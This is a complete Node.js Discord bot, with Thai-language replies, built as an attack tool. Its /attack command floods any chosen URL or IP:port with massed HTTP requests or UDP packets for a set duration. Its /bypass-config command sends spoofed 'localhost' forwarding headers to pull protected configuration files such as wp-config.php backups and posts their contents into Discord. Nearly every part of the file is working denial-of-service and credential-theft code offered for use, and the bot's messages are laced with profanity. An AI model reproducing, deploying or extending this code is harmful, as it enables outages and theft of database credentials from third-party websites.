/**
 * ============================================================================
 * JEFF FUJI - 403 BYPASS & CONFIG STEALER ENGINE v8
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเป้าหมาย (L7 HTTP หรือ L4 UDP Flood)')
            .addStringOption(option => 
                option.setName('type')
                    .setDescription('เลือกโหมดการยิง')
                    .setRequired(true)
                    .addChoices(
                        { name: '🌐 L7 (HTTP/HTTPS Flood)', value: 'l7' },
                        { name: '⚡ L4 (UDP Network Flood)', value: 'l4' }
                    ))
            .addStringOption(option => 
                option.setName('target')
                    .setDescription('URL (สำหรับ L7) หรือ IP:Port (สำหรับ L4)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('bypass-config')
            .setDescription('พยายามบายพาสกำแพง 403 และดึงไฟล์ Config เป้าหมายอัตโนมัติ')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL ไฟล์ที่ติด 403 (เช่น https://bewergame.com/wp-config.php.bak)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const attackType = interaction.options.getString('type');
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        if (attackType === 'l7') {
            try {
                const parsedUrl = new URL(target);
                const requester = parsedUrl.protocol === 'https:' ? https : http;
                const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

                await interaction.reply(`🚀 **[L7 HTTP FLOOD]** เริ่มซัด **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

                const fireL7 = () => {
                    if (!isAttacking || Date.now() >= endTime) return;

                    const options = {
                        hostname: parsedUrl.hostname,
                        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                        path: parsedUrl.pathname + parsedUrl.search,
                        method: 'GET',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Connection': 'keep-alive'
                        },
                        agent: currentAgent
                    };

                    const req = requester.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => { if (isAttacking) setImmediate(fireL7); });
                    });

                    req.on('error', () => { if (isAttacking) setImmediate(fireL7); });
                    req.end();
                };

                for (let i = 0; i < 300; i++) {
                    fireL7();
                }

            } catch (err) {
                isAttacking = false;
                return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
            }

        } else if (attackType === 'l4') {
            const parts = target.split(':');
            if (parts.length !== 2) {
                isAttacking = false;
                return interaction.reply({ content: '❌ รูปแบบ L4 ต้องเป็น IP:Port เท่านั้น (เช่น 123.45.67.89:80)', ephemeral: true });
            }

            const host = parts[0];
            const port = parseInt(parts[1]);

            await interaction.reply(`🔥 **[L4 NETWORK FLOOD]** เริ่มระเบิดท่อใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const payload = Buffer.alloc(1024);
            for (let i = 0; i < 200; i++) {
                const clientUdp = dgram.createSocket('udp4');
                const sendUdp = () => {
                    if (!isAttacking || Date.now() >= endTime) {
                        clientUdp.close();
                        return;
                    }
                    clientUdp.send(payload, port, host, () => {
                        setImmediate(sendUdp);
                    });
                };
                sendUdp();
            }
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'bypass-config') {
        const targetUrl = interaction.options.getString('url');
        await interaction.reply(`🔓 **[403 BYPASS ENGINE]** กำลังส่งชุด Headers และเทคนิคหลบเลี่ยงเพื่อดึงข้อมูลจาก **${targetUrl}** รอแป๊บไอ้สัส...`);

        try {
            const parsedUrl = new URL(targetUrl);
            const reqLib = parsedUrl.protocol === 'https:' ? https : http;

            // เทคนิค Header Spoofing หลอกเซิร์ฟเวอร์ว่าเป็นแอดมินหรือมาจากภายใน
            const bypassHeaders = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdminBypassClient/2.0',
                'X-Forwarded-For': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Forwarded-Host': parsedUrl.host,
                'Referer': `${parsedUrl.protocol}//${parsedUrl.host}/admin`,
                'Connection': 'close'
            };

            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: 'GET',
                headers: bypassHeaders,
                agent: parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent
            };

            const req = reqLib.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', async () => {
                    const isSuccess = res.statusCode === 200;
                    const embed = new EmbedBuilder()
                        .setTitle('💥 403 Bypass & Config Stealer Report')
                        .setColor(isSuccess ? 0x22c55e : 0xf59e0b)
                        .addFields(
                            { name: 'Target URL', value: targetUrl },
                            { name: 'Bypass Status', value: `HTTP Status: ${res.statusCode} ${res.statusMessage}` },
                            { name: 'Payload Response', value: data.length > 0 ? `\`\`\`php\n${data.slice(0, 800)}\n\`\`\`` : '*(Empty Response / Blocked)*' }
                        )
                        .setTimestamp();

                    await interaction.followUp({ embeds: [embed] });
                });
            });

            req.on('error', async (err) => {
                await interaction.followUp(`❌ Bypass ล้มเหลว: ${err.message}`);
            });
            req.end();

        } catch (err) {
            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
        }

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
